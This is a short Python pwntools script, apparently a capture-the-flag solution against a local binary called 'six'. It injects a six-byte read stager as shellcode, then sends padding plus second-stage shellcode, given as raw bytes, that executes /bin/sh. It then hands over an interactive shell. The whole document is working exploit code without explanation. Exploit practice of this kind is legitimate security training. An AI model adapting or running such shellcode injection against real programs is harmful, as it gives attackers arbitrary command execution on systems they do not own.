from pwn import *

p = process('./six')
context.log_level = 'debug'

p.recvuntil('Show Ne0 your shellcode:\n')
#payload = '''push rsp
#             pop rsi
#             mov edx,esi
#             syscall
#          '''
#gdb.attach(p)
p.send('\x54\x5e\x8b\xd6\x0f\x05')

z=[0xB8, 0x3B, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xFE, 0x48, 0x81, 0xC7, 0x4e, 0x0B, 0x00, 0x00, 0x4b, 0x48,0x33, 0xD2, 0x48,0x33, 0xF6, 0x0F, 0x05, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00]
zz=''
for i in range(0,len(z)):
    zz+=chr(z[i])

p.sendline('A'*0xb36 + zz)

p.interactive()
